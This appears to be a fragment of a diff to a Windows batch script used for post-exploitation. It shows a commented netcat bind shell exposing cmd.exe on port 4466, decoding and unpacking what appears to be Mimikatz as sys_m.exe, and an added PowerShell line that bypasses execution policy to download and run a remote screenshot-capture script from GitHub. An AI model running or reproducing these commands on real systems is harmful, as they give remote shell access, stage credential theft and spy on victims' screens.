@@ -8,5 +8,8 @@ rem %Temp%\nc.exe -nLvp 4466 -e cmd.exe
 %temp%\cr.tmp -decode %Temp%\mim.b %Temp%\mim
 expand %Temp%\mim %Temp%\sys_m.exe
 
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/Take-ScreenShot.ps1')"
+
+
 
 
